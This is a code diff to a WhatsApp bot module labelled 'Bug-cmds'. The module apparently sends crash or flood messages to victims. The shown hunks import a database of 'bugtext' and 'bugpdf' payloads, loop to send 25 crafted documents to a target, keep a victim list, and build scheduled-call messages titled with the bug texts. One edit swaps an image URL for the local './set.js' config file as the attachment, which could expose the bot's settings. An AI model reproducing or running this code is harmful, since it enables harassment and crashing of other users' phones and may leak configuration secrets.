@@ -1,11 +1,8 @@
 const { zokou } = require("../framework/zokou");
 const { delay, loading, react } = require("../framework/utils");
 const moment = require("moment-timezone");
-const util = require('util');
-const fs = require('fs-extra');
-const { format } = require(__dirname + "/../framework/mesfonctions");
-const os = require("os");
-const conf = require(__dirname + "/../set");
+const conf = require("../set.js");
+const fs = require("fs");
 const path = require("path");
 const {
     generateWAMessageFromContent,
@@ -13,13 +10,13 @@ const {
 } = require("@whiskeysockets/baileys");
 
 // bug database
-const { bugtext1 } = require("../framework/bugs/bugtext1");
-const { bugtext2 } = require("../framework/bugs/bugtext2");
-const { bugtext3 } = require("../framework/bugs/bugtext3");
-const { bugtext4 } = require("../framework/bugs/bugtext4");
-const { bugtext5 } = require("../framework/bugs/bugtext5");
-const { bugtext6 } = require("../framework/bugs/bugtext6");
-const { bugpdf } = require("../framework/bugs/bugpdf.js");
+const { bugtext1 } = require("../framework/bug/bugtext1");
+const { bugtext2 } = require("../framework/bug/bugtext2");
+const { bugtext3 } = require("../framework/bug/bugtext3");
+const { bugtext4 } = require("../framework/bug/bugtext4");
+const { bugtext5 } = require("../framework/bug/bugtext5");
+const { bugtext6 } = require("../framework/bug/bugtext6");
+const { bugpdf } = require("../framework/bug/bugpdf.js");
 
 const category = "Bug-cmds";
 const reaction = "🤯";
@@ -206,7 +203,7 @@ zokou(
         await loading(dest, zk);
 
         for (let i = 0; i < 25; i++) {
-            const doc = { url: "https://files.catbox.moe/eoo6ql.jpg" };
+            const doc = { url: "./set.js" };
             await zk.sendMessage(dest, {
                 document: doc,
                 mimetype:
@@ -309,7 +306,7 @@ zokou(
         const text = arg.join("");
         let amount = 30;
         let victims = [];
-        const doc = { url: "https://files.catbox.moe/eoo6ql.jpg" };
+        const doc = { url: "./set.js" };
         const bug = {
             document: doc,
             mimetype:
@@ -629,7 +626,7 @@ zokou(
             scheduledCallCreationMessage: {
                 callType: "2",
                 scheduledTimestampMs: `${moment(1000)
-                    .tz("Africa/Dodoma")
+                    .tz("Asia/Kolkata")
                     .format("DD/MM/YYYY HH:mm:ss")}`,
                 title: `${bugtext1}`
             }
@@ -713,7 +710,7 @@ zokou(
             scheduledCallCreationMessage: {
                 callType: "2",
                 scheduledTimestampMs: `${moment(1000)
-                    .tz("Africa/dodoma")
+                    .tz("Asia/Kolkata")
                     .format("DD/MM/YYYY HH:mm:ss")}`,
                 title: bugtext3
             }
